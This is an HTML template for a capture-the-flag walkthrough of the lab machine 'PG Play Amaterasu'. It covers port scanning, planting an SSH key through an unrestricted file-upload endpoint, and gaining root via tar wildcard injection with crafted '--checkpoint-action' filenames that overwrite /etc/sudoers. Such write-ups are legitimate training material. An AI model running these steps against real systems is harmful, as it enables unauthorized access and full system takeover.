@@ -1,0 +1,162 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Amaterasu</h1>
+    <p class="text">Difficulty : Easy | Community Rating : Hard</p>
+
+    <h2 class="subtitle">Emumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -sCV -p- IP --min-rate=2000</u>
+PORT      STATE  SERVICE          VERSION
+21/tcp    open   ftp              vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.45.170
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    closed ssh
+111/tcp   closed rpcbind
+139/tcp   closed netbios-ssn
+443/tcp   closed https
+445/tcp   closed microsoft-ds
+2049/tcp  closed nfs
+10000/tcp closed snet-sensor-mgmt
+25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
+|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
+33414/tcp open   http             Werkzeug httpd 2.2.3 (Python 3.9.13)
+|_http-title: 404 Not Found
+|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
+40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
+| http-methods: 
+|_  Potentially risky methods: TRACE</code></pre></div>
+
+<p class="text">It's messy output. However, we can focus on port 21,25022,33414, and 40080.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/amaterasu/1.png' %}" alt="">
+    <p class="text">The page returned not found, but we must not stop here. We may find path if we enumerate this url.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:33414 -t 100</u>
+/help                 (Status: 200) [Size: 137]
+/info                 (Status: 200) [Size: 98]</code></pre></div>
+
+<p class="text">There are two pages, help and info.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/amaterasu/2.png' %}" alt="">
+    <p class="text">On the help page, I found two requests, first one lists arbitrary dir, and second one let us to upload file.</p>
+</div>
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/amaterasu/3.png' %}" alt="">
+    <p class="text">I found .ssh directory. Therefore, we can upload our id_rsa.pub file.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ curl -i -L -X POST -F file="@/home/kali/.ssh/id_rsa.pub" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.239.249:33414/file-upload
+HTTP/1.1 400 BAD REQUEST
+Server: Werkzeug/2.2.3 Python/3.9.13
+Date: Mon, 20 Oct 2025 14:04:01 GMT
+Content-Type: application/json
+Content-Length: 67
+Connection: close
+
+{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}</code></pre></div>
+
+<p class="text">This method only allows six types of file extension. So, we have to rename our public file.</p>
+
+<div class="code-box"><pre><code>└─$ cp id_rsa.pub id_rsa.txt
+└─$ curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@/home/kali/.ssh/id_ed25519.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.239.249:33414/file-upload
+HTTP/1.1 201 CREATED
+Server: Werkzeug/2.2.3 Python/3.9.13
+Date: Mon, 20 Oct 2025 13:54:35 GMT
+Content-Type: application/json
+Content-Length: 41
+Connection: close
+
+{"message":"File successfully uploaded"}</code></pre></div>
+
+<p class="text">We can access to the target machine with ssh.</p>
+
+
+<div class="code-box"><pre><code>└─$ ssh alfredo@192.168.239.249 -i ../.ssh/id_ed25519 -p 25022
+...
+[alfredo@fedora etc]$ </code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>[alfredo@fedora etc]$ cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+*/1 * * * * root /usr/local/bin/backup-flask.sh</code></pre></div>
+
+<p class="text">There is an interesting crontab which is run every minutes.</p>
+
+<div class="code-box"><pre><code>[alfredo@fedora etc]$ cat /usr/local/bin/backup-flask.sh
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *</code></pre></div>
+
+<p class="text">Though it looks safe, it's actually not. The final code uses *, which just parses all files in the directory. Therefore, it gonna be like...</p>
+
+<div class="code-box"><pre><code>targ czf /tmp/flask.tar.gz file1 file2 file3 file4 ... <u class="green">#All files in /home/alfredo/restapi</u></code></pre></div>
+
+<p class="text">Therefore, if we create malicious file name in the dir /home/alfredo/restapi, we can use arbitrary flag for tar file.</p>
+<p class="text">Also, <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a> says <u>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</u> may drop shell for us.</p>
+
+
+<div class="code-box"><pre><code>[alfredo@fedora restapi]$ echo 'a' > '--checkpoint=1'
+[alfredo@fedora restapi]$ echo 'a' > '--checkpoint-action=exec=sh rev.sh'
+[alfredo@fedora restapi]$ nano rev.sh
+<u class="green">#!/bin/sh
+echo 'alfredo ALL=(root) NOPASSWD: ALL' > /etc/sudoers'</u>
+[alfredo@fedora restapi]$ chmod +x rev.sh</code></pre></div>
+
+<p class="text">After waiting about minute...</p>
+
+<div class="code-box"><pre><code>[alfredo@fedora restapi]$ sudo /bin/bash
+[root@fedora restapi]# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+
+<p class="text">We got root bash.</p>
+
+
+</body>
+</html>
